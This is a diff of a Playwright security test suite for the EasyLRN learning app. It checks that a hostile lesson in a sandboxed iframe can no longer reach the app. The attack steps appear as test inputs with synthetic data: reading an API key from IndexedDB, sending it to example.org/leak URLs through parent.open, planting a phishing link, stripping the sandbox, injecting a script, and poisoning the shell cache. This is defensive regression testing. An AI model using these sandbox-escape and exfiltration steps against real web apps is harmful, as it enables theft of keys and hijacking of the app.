@@ -3,9 +3,10 @@
 // reading position after a reload, more Service Worker path cases, more CSP
 // cases, and what a script in a lesson can really do to the app.
 //
-// Known defects are marked test.fail() with their id from the T-010 log
-// (T010-S1). When a defect is fixed, its test starts to fail as "expected to
-// fail": then remove test.fail.
+// Known defects were marked test.fail() with their id from the T-010 log
+// (T010-S1, T010-D2). T-045 (D-029: the lesson in an opaque origin) fixed
+// them: test.fail is removed and the attacks are wrapped so that a blocked
+// attempt (SecurityError) is an outcome, not a test error.
 //
 // Synthetic data only (D-026): tests/fixtures/LRN-DEMO and a tiny hostile
 // course LRN-EVIL built in memory here.
@@ -62,6 +63,8 @@ async function open(page, course, number = '0001') {
   await page.goto(`./#/c/${course}`);
   await page.goto(`./#/c/${course}/read/${number}`);
   await expect(lf(page).locator('h1').first()).toBeVisible();
+  // T-045: the bridge answered and the app sent the settings (text size, colours).
+  await expect(page.locator('[data-lesson-state="ready"]')).toBeVisible();
   await page.locator('iframe.lesson-frame').evaluate(() => new Promise((r) => setTimeout(r, 200)));
 }
 
@@ -160,7 +163,6 @@ test.describe('T-010 display', () => {
 test.describe('T-010 reading position between two readers', () => {
   test('[T010-D2] a quick Back from R01 to the lesson does not overwrite the saved position of R01', async ({ page }, info) => {
     test.skip(info.project.name !== 'tablet-landscape', 'one size is enough');
-    test.fail(true, 'T010-D2: Back within ~1.5 s saves the scroll of the lesson as the position of R01; R01 then opens at its end');
     // Longer files (in memory) so that both scroll.
     const refPath = 'reference/R01-temperatura-i-vreme.html';
     const pad = (path, px) => strToU8(new TextDecoder().decode(FILES[path]).replace('</body>', `<div style="height:${px}px"></div></body>`));
@@ -307,10 +309,14 @@ test.describe('T-010 CSP of the lesson (more cases)', () => {
       const out = {};
       try { top.location.href = 'https://example.org/top'; out.top = 'set'; } catch (e) { out.top = e.name; }
       try { parent.location.hash = '#/settings'; out.hash = 'set'; } catch (e) { out.hash = e.name; }
-      const fm = parent.document.createElement('form'); fm.action = 'https://example.org/f'; parent.document.body.append(fm); fm.submit(); fm.remove();
+      try {
+        const fm = parent.document.createElement('form'); fm.action = 'https://example.org/f'; parent.document.body.append(fm); fm.submit(); fm.remove();
+        out.form = 'submitted';
+      } catch (e) { out.form = e.name; }
       return out;
     });
-    expect(r).toEqual({ top: 'SecurityError', hash: 'SecurityError' });
+    // T-045: the lesson cannot even reach parent.document (opaque origin).
+    expect(r).toEqual({ top: 'SecurityError', hash: 'SecurityError', form: 'SecurityError' });
     await page.waitForTimeout(800);
     expect(page.url()).toMatch(/\/EasyLRN\/#\/c\/LRN-DEMO\/read\/0001$/);
     expect(leaked).toEqual([]);
@@ -334,81 +340,110 @@ async function openEvil(page) {
   return frameOf(page, 'LRN-EVIL');
 }
 
-test.describe('T010-S1: a lesson script reaches the whole app (allow-same-origin on the same origin)', () => {
-  test('facts: the lesson reads the app DOM, localStorage, the API key in IndexedDB and the shell cache', async ({ page }) => {
+test.describe('T010-S1: a lesson script cannot reach the app (T-045: opaque origin, D-029)', () => {
+  test('facts: the lesson cannot read the app DOM, localStorage, the API key in IndexedDB or the shell cache', async ({ page }) => {
     const f = await openEvil(page);
-    const r = await f.evaluate(() => new Promise((ok) => {
-      const req = indexedDB.open('lrn-app');
-      req.onsuccess = () => {
-        const g = req.result.transaction('settings').objectStore('settings').get('settings');
-        g.onsuccess = async () => ok({
-          parentTitle: parent.document.querySelector('#app-bar-title')?.textContent,
-          localStorage: typeof localStorage.getItem,
-          apiKey: g.result?.apiKey,
-          caches: (await caches.keys()).some((k) => k.startsWith('easylrn-shell-')),
-        });
+    const r = await f.evaluate(async () => {
+      const attempt = async (fn) => { try { return await fn(); } catch (e) { return `blocked:${e.name}`; } };
+      return {
+        origin: self.origin,
+        parentTitle: await attempt(() => parent.document.querySelector('#app-bar-title')?.textContent),
+        frameElement: await attempt(() => (window.frameElement === null ? 'null' : 'element')),
+        localStorage: await attempt(() => localStorage.getItem('x')),
+        apiKey: await attempt(() => new Promise((ok, fail) => {
+          const req = indexedDB.open('lrn-app');
+          req.onerror = () => fail(req.error);
+          req.onsuccess = () => {
+            try {
+              const g = req.result.transaction('settings').objectStore('settings').get('settings');
+              g.onsuccess = () => ok(g.result?.apiKey ?? 'no key');
+            } catch (e) { ok('no lrn-app store'); }
+          };
+          req.onupgradeneeded = () => ok('empty db');
+        })),
+        caches: await attempt(async () => (await caches.keys()).join(',')),
       };
-    }));
-    // This is what D-011 accepted as the residual risk ("can read parent").
-    expect(r).toEqual({ parentTitle: 'Урок 0001', localStorage: 'function', apiKey: FAKE_KEY, caches: true });
+    });
+    expect(r.origin).toBe('null');
+    expect(r.parentTitle).toMatch(/^blocked:SecurityError/);
+    expect(r.frameElement).toBe('null');
+    expect(r.localStorage).toMatch(/^blocked:/);
+    expect(r.apiKey).toMatch(/^blocked:/);
+    expect(r.caches).toMatch(/^blocked:/);
+    expect(JSON.stringify(r)).not.toContain(FAKE_KEY);
   });
 
   test('[T010-S1a] the key cannot leave through parent.open() (a popup with data in the URL)', async ({ page, context }) => {
-    test.fail(true, 'T010-S1a: parent.open()/window.open() send the data to any site; CSP does not cover navigations');
+    allowed = [/Blocked opening .* sandboxed frame whose 'allow-popups' permission is not set/];
     const f = await openEvil(page);
     const popup = context.waitForEvent('page', { timeout: 3000 }).catch(() => null);
-    await f.evaluate((k) => { parent.open(`https://example.org/leak?k=${k}`); }, FAKE_KEY);
+    await f.evaluate((k) => {
+      try { parent.open(`https://example.org/leak?k=${k}`); } catch { /* blocked */ }
+      try { window.open(`https://example.org/leak2?k=${k}`); } catch { /* blocked */ }
+    }, FAKE_KEY);
     await popup;
     await page.waitForTimeout(500);
     expect(leaked.filter((u) => u.includes(FAKE_KEY))).toEqual([]);
   });
 
   test('[T010-S1b] the lesson cannot navigate the app away by clicking a link it puts in the app document', async ({ page }) => {
-    test.fail(true, 'T010-S1b: a link created in parent.document and clicked navigates top (sandbox does not apply)');
     const f = await openEvil(page);
     await f.evaluate((k) => {
-      const a = parent.document.createElement('a');
-      a.href = `https://example.org/phish?k=${k}`;
-      parent.document.body.append(a);
-      a.click();
+      try {
+        const a = parent.document.createElement('a');
+        a.href = `https://example.org/phish?k=${k}`;
+        parent.document.body.append(a);
+        a.click();
+      } catch { /* blocked */ }
     }, FAKE_KEY);
     await page.waitForTimeout(1000);
     expect(page.url()).toMatch(/\/EasyLRN\//);
   });
 
   test('[T010-S1c] the lesson cannot remove the sandbox of its own iframe', async ({ page }) => {
-    test.fail(true, 'T010-S1c: frame element is writable from the lesson; after a reload the lesson runs without sandbox and can set top.location');
+    // location.reload() of a sandboxed lesson does not go through the Service Worker (404 from the
+    // server); the app then loads the lesson again. top.location is refused.
+    allowed = [/status of 404/, /Unsafe attempt to initiate navigation/];
     const f = await openEvil(page);
-    await f.evaluate(() => { parent.document.querySelector('iframe.lesson-frame').removeAttribute('sandbox'); location.reload(); });
+    await f.evaluate(() => {
+      try { parent.document.querySelector('iframe.lesson-frame').removeAttribute('sandbox'); } catch { /* blocked */ }
+      try { window.frameElement?.removeAttribute('sandbox'); } catch { /* blocked */ }
+      location.reload();
+    });
     await page.waitForTimeout(1000);
     const f2 = frameOf(page, 'LRN-EVIL');
-    await f2.evaluate(() => { top.location.href = 'https://example.org/top-unsandboxed'; }).catch(() => {});
+    await f2?.evaluate(() => { top.location.href = 'https://example.org/top-unsandboxed'; }).catch(() => {});
+    await expect(page.locator('iframe.lesson-frame')).toHaveAttribute('sandbox', 'allow-scripts');
     await page.waitForTimeout(1000);
     expect(page.url()).toMatch(/\/EasyLRN\//);
   });
 
   test('[T010-S1d] the lesson cannot run a script in the app (script element in the app document)', async ({ page }) => {
-    test.fail(true, "T010-S1d: app CSP script-src 'self' allows ./c/<course>/*.js, so a lesson file runs as app code");
     const f = await openEvil(page);
     const r = await f.evaluate(() => new Promise((ok) => {
-      const s = parent.document.createElement('script');
-      s.src = './c/LRN-EVIL/assets/x.js';
-      s.onload = () => ok(parent.__fromLesson ?? 'not run');
-      s.onerror = () => ok('blocked');
-      parent.document.head.append(s);
+      try {
+        const s = parent.document.createElement('script');
+        s.src = './c/LRN-EVIL/assets/x.js';
+        s.onload = () => ok(parent.__fromLesson ?? 'not run');
+        s.onerror = () => ok('blocked');
+        parent.document.head.append(s);
+      } catch { ok('blocked'); }
     }));
     expect(r).toBe('blocked');
   });
 
   test('[T010-S1e] the lesson cannot replace the app shell in the cache (persists after the course is gone)', async ({ page }) => {
-    test.fail(true, 'T010-S1e: Cache API is shared: a lesson can put its own index.html/main.js into easylrn-shell-<version>');
     const f = await openEvil(page);
-    await f.evaluate(async () => {
-      const key = (await caches.keys()).find((k) => k.startsWith('easylrn-shell-'));
-      const cache = await caches.open(key);
-      await cache.put(new URL('../../../index.html', location.href).href,
-        new Response('<!DOCTYPE html><title>PWNED</title><p>PWNED</p>', { headers: { 'Content-Type': 'text/html' } }));
+    const r = await f.evaluate(async () => {
+      try {
+        const key = (await caches.keys()).find((k) => k.startsWith('easylrn-shell-'));
+        const cache = await caches.open(key);
+        await cache.put(new URL('../../../index.html', location.href).href,
+          new Response('<!DOCTYPE html><title>PWNED</title><p>PWNED</p>', { headers: { 'Content-Type': 'text/html' } }));
+        return 'replaced';
+      } catch (e) { return e.name; }
     });
+    expect(r).toBe('SecurityError');
     // The course is deleted (as far as the app can: soft delete) and the app is reopened.
     await page.goto('./');
     await page.waitForTimeout(300);
@@ -416,7 +451,6 @@ test.describe('T010-S1: a lesson script reaches the whole app (allow-same-origin
   });
 
   test('[T010-S1f] the lesson cannot call the Claude API with the key (parent.fetch is outside the lesson CSP)', async ({ page }) => {
-    test.fail(true, "T010-S1f: parent.fetch() runs under the app CSP (connect-src https://api.anthropic.com)");
     const f = await openEvil(page);
     const r = await f.evaluate(async (k) => {
       try {
@@ -427,10 +461,13 @@ test.describe('T010-S1: a lesson script reaches the whole app (allow-same-origin
     expect(r).toBe('blocked');
   });
 
-  test('a style @import can only reach fonts.googleapis.com (data in the URL goes to Google, not elsewhere)', async ({ page, context }) => {
+  test('a style @import reaches nobody, not even fonts.googleapis.com (Н-1 closed by D-031)', async ({ page, context }) => {
     allowed = [/Content Security Policy|violates/i];
     const google = [];
-    context.on('request', (q) => { if (q.url().includes('fonts.googleapis.com')) google.push(q.url()); });
+    // A request the CSP refuses is still reported as `request` (then `requestfailed: csp`): count the ones that finished.
+    context.on('requestfinished', (q) => { if (q.url().includes('fonts.googleapis.com')) google.push(q.url()); });
+    const refused = [];
+    context.on('requestfailed', (q) => { if (q.url().includes('fonts.googleapis.com')) refused.push(q.failure()?.errorText); });
     const f = await openEvil(page);
     await f.evaluate(() => {
       const s = document.createElement('style');
@@ -438,7 +475,8 @@ test.describe('T010-S1: a lesson script reaches the whole app (allow-same-origin
       document.head.append(s);
     });
     await page.waitForTimeout(800);
-    expect(google.some((u) => u.includes('T010LEAK'))).toBe(true); // observation Н-1 of T-010
+    expect(refused.length).toBeGreaterThan(0);
+    expect(google).toEqual([]); // T-045/D-031: the lesson CSP has no Google Fonts any more (was observation Н-1)
     expect(leaked).toEqual([]);
   });
 });
